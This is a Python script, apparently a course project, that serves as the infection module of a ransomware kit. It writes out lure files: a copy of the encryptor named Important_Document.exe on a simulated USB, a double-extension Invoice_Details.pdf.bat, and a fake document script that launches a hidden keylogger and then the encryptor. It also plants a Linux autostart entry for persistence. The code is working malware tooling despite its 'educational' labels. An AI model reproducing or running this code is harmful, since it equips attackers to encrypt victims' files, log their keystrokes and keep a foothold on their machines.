#!/usr/bin/env python3
""" 
A component of ransomware infection
For educational purposes, this script illustrates several infection vectors.

NOTICE: To teach cybersecurity, the project mimics infection techniques.
"""

import os                               # Operating system interface
import sys                              # System-specific parameters and functions
import shutil                           # High-level file operations
import subprocess                       # Subprocess management
from pathlib import Path               # Object-oriented filesystem paths

class RansomwareInfection:
    """
    Class to simulate various ransomware infection vectors.
    Demonstrates common attack methods used by real ransomware.
    """
    
    def __init__(self, target_dir="~/personal_1000"):
        """
        Initialize the infection simulator with target directory.
        
        Args:
            target_dir (str): Default target directory for attacks
        
        Returns:
            None
        """
        # Expand user directory path (convert ~ to actual home path)
        self.target_dir = os.path.expanduser(target_dir)
        
        # Get current script directory for relative paths
        self.current_dir = os.path.dirname(os.path.abspath(__file__))
         
    def create_malicious_usb_simulation(self):
        """
        Simulate USB-based infection vector.
        This is a common ransomware distribution method.
        
        Returns:
            None
        """
        print("[+] Creating simulated malicious USB infection")
         
        # Create simulated USB directory (would be actual USB mount point)
        usb_dir = os.path.expanduser("~/simulated_usb")
        os.makedirs(usb_dir, exist_ok=True)
         
        # Copy ransomware components to fake USB drive
        shutil.copy("encrypt.py", usb_dir)      # Encryption component
        shutil.copy("keylogger.py", usb_dir)    # Infection spread component
         
        # Create attractive filename to entice users
        shutil.copy("encrypt.py", os.path.join(usb_dir, "Important_Document.exe"))
         
        # Inform user of simulated USB creation
        print(f"[+] Simulated USB created at: {usb_dir}")
        print("[+] Files copied:")
        for item in os.listdir(usb_dir):
            print(f"    - {item}")
             
    def create_phishing_email_simulation(self):
        """
        Simulate email attachment infection vector.
        This demonstrates how ransomware spreads via email phishing.
        
        Returns:
            None
        """
        print("[+] Creating phishing email simulation")
         
        # Create directory for simulated email attachments
        attachment_dir = os.path.expanduser("~/email_attachments")
        os.makedirs(attachment_dir, exist_ok=True)
         
        # Create PDF-like malicious document with .bat extension
        # This exploits user trust in PDF files
        with open(os.path.join(attachment_dir, "Invoice_Details.pdf.bat"), "w") as f:
            # Batch script that executes ransomware
            f.write("@echo off\n")
            f.write("echo This is a simulated ransomware execution\n")
            f.write("timeout /t 2 >nul\n")  # Simulate processing delay
            f.write(f"python {os.path.join(self.current_dir, 'encrypt.py')} {self.target_dir}\n")
            f.write("pause\n")
             
        # Inform user of phishing simulation creation
        print(f"[+] Phishing email attachment created at: {attachment_dir}")
        print("[+] Attachment: Invoice_Details.pdf.bat")
         
    def create_malicious_document(self):
        """
        Create a malicious document that executes ransomware.
        This simulates document-based attacks that exploit macro vulnerabilities.
        
        Returns:
            None
        """
        # Create malicious shell script content
        doc_content = f"""#!/bin/bash
# Educational malicious script for CSCE 5550
# This demonstrates document-based infection vectors

echo "Opening document..." 
sleep 1
echo "Document opened successfully"

# Background keylogger (infection spread mechanism)
# This simulates how ransomware spreads to other systems
nohup python3 {os.path.join(self.current_dir, "keylogger.py")} > /dev/null 2>&1 &

# Ransomware execution after delay
# This simulates realistic attack timing
sleep 3
echo "Document processed"
echo "Initiating security scan..." 
python3 {os.path.join(self.current_dir, "encrypt.py")} {self.target_dir} &

echo "Process complete"
"""
         
        # Write malicious document to file
        with open("malicious_document.sh", "w") as f:
            f.write(doc_content)
             
        # Make the script executable
        os.chmod("malicious_document.sh", 0o755)
        print("[+] Created malicious document: malicious_document.sh")
         
    def auto_execute_infection(self):
        """
        Simulate automatic execution on system startup.
        This demonstrates persistence mechanisms used by ransomware.
        
        Returns:
            None
        """
        print("[+] Setting up auto-execution infection")
         
        # Create startup script content
        startup_script = f"""#!/bin/bash
# Simulated ransomware startup script
# This enables persistence across reboots
sleep 5
cd {self.current_dir}
python3 keylogger.py &  # Continue infection spread
sleep 10
python3 encrypt.py {self.target_dir}  # Execute encryption
"""
         
        # Determine Linux autostart directory
        startup_path = os.path.expanduser("~/.config/autostart/ransomware_sim.sh")
        os.makedirs(os.path.dirname(startup_path), exist_ok=True)
         
        # Write startup script to autostart location
        with open(startup_path, "w") as f:
            f.write(startup_script)
             
        # Make startup script executable
        os.chmod(startup_path, 0o755)
        print(f"[+] Auto-startup script placed at: {startup_path}")
         
    def show_infection_vectors(self):
        """
        Display available infection vectors and get user selection.
        
        Returns:
            None
        """
        print("\n[+] Available Infection Vectors for Ransomware:")
        print("1. Simulated USB Drive (autorun.inf method)")
        print("2. Phishing Email Attachment (.exe disguised as .pdf)")
        print("3. Malicious Document Execution")
        print("4. System Startup Persistence")
         
        # Get user choice of infection vector
        choice = input("\nSelect infection vector (1-4): ")
         
        # Execute selected infection vector simulation
        if choice == "1":
            self.create_malicious_usb_simulation()
        elif choice == "2":
            self.create_phishing_email_simulation()
        elif choice == "3":
            self.create_malicious_document()
        elif choice == "4":
            self.auto_execute_infection()
        else:
            print("[-] Invalid choice")

def main():
    """
    Main function to create and run the infection simulator.
    Provides educational demonstration of ransomware infection vectors.
    """
    print("=== CSCE 5550 Ransomware Infection Component ===")
     
    # Create infection simulator instance
    infection = RansomwareInfection()
    infection.show_infection_vectors()
     
    # Inform user that components were created successfully
    print("\n[+] Infection components created successfully")
    print("[+] These are for educational demonstration only")
    print("[+] Always ensure proper authorization before testing")

# Execute main function when script is run directly
if __name__ == "__main__":
    main()
